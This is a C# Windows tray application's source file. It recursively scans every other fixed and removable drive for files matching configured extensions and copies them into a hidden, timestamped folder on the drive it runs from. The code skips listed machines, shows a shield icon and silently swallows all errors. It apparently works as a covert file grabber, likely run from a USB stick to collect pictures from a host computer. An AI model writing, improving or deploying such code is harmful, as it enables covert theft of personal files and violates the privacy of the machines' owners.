using System;
using System.Collections.Concurrent;
using System.ComponentModel;
using System.Configuration;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;

namespace Pics
{
    internal class CustomApplicationContext : ApplicationContext
    {
        NotifyIcon _trayIcon;
        ContextMenuStrip _menuStrip;
        ToolStripItem _quit;

        BackgroundWorker _scanWorker;
        BackgroundWorker _copyWorker;
        private string[] _pattern;
        private int _minFileSize = 1024;// * 1024;

        ConcurrentQueue<FileInfo> _filesToCopy;

        public bool Quit
        {
            get;
            protected set;
        }

        public CustomApplicationContext()
        {
            
            int minSize;
            if (int.TryParse(ConfigurationManager.AppSettings["MinSize"], out minSize))
            {
                _minFileSize = minSize;
            }

            string ignoredComputers = ConfigurationManager.AppSettings["IgnoredComputers"];
            var computers = ignoredComputers.Split('|');
            if (computers.Contains(Environment.MachineName))
            {
                Quit = true;
                return;
            }

            _filesToCopy = new ConcurrentQueue<FileInfo>();

            _menuStrip = new ContextMenuStrip();
            _quit = new ToolStripMenuItem { Text = "Quit" };
            _quit.Click += _quit_Click;
            _menuStrip.Items.Add(_quit);
            _trayIcon = new NotifyIcon { Visible = true, Icon = SystemIcons.Shield };
            _trayIcon.ContextMenuStrip = _menuStrip;

            _scanWorker = new BackgroundWorker() { WorkerSupportsCancellation = true };
            _scanWorker.DoWork += _scanWorker_DoWork;
            _scanWorker.RunWorkerAsync();

            _copyWorker = new BackgroundWorker() { WorkerSupportsCancellation = true };
            _copyWorker.DoWork += _copyWorker_DoWork;
            _copyWorker.RunWorkerCompleted += _copyWorker_RunWorkerCompleted;
            _copyWorker.RunWorkerAsync();
        }
        
        private void _copyWorker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            _trayIcon.Visible = false;
            _trayIcon.Dispose();
            Application.Exit();
        }

        private void _copyWorker_DoWork(object sender, DoWorkEventArgs e)
        {
            var currentDir = Directory.CreateDirectory(Path.Combine(Path.GetPathRoot(Environment.CurrentDirectory), DateTime.Now.ToString("yyyy_MM_dd_HH_mm_ss")));
            currentDir.Attributes = FileAttributes.Hidden;
            while(!_copyWorker.CancellationPending)
            {
                try
                {
                    FileInfo file;
                    if (_filesToCopy.TryDequeue(out file))
                    {
                        if (file != null && file.Exists)
                        {
                            string newName = file.FullName.Replace(Path.GetPathRoot(file.FullName), currentDir.FullName + Path.DirectorySeparatorChar+ Path.GetPathRoot(file.FullName).Substring(0,1) + Path.DirectorySeparatorChar);
                            Directory.CreateDirectory(Path.GetDirectoryName(newName));
                            File.Copy(file.FullName, newName);
                        }
                    }
                    else
                    {
                        if(!_scanWorker.IsBusy)
                        {
                            break;
                        }
                    }
                }
                catch(Exception ex)
                {

                }
            }
            e.Cancel = true;

        }
        

        private void _scanWorker_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {
                string extensions = ConfigurationManager.AppSettings["Extensions"];
               
                _pattern = extensions.Split(';');
                var info = new DriveInfo(Path.GetPathRoot(Environment.CurrentDirectory));

                var drives = DriveInfo.GetDrives().Where(x => (x.DriveType == DriveType.Fixed || x.DriveType == DriveType.Removable) && !string.Equals(x.Name, info.Name, StringComparison.InvariantCultureIgnoreCase));

                while (!_scanWorker.CancellationPending)
                {
                    foreach (var drive in drives)
                    {
                        var dir = drive.RootDirectory;
                        ScanFolder(dir);
                    }
                    break;
                    //scan
                }
                e.Cancel = true;
            }
            catch(Exception ex)
            {
            }
            
        }

        

        private void ScanFolder(DirectoryInfo dir)
        {
            try
            {
                foreach (var pattern in _pattern)
                {
                    if (_scanWorker.CancellationPending)
                        break;

                    if (!string.IsNullOrEmpty(pattern))
                    {
                        var files = dir.EnumerateFiles(pattern, SearchOption.TopDirectoryOnly);
                        foreach (var file in files)
                        {
                            if (file.Length > _minFileSize)
                            {
                                _filesToCopy.Enqueue(file);
                            }
                        }
                    }
                }
                foreach(var folder in dir.GetDirectories("*", SearchOption.TopDirectoryOnly))
                {
                    if (_scanWorker.CancellationPending)
                        break;
                    ScanFolder(folder);
                }
                
            }
            catch
            {

            }
        }

        private void _quit_Click(object sender, System.EventArgs e)
        {
            _scanWorker.CancelAsync();
            _copyWorker.CancelAsync();
        }
    }
    
}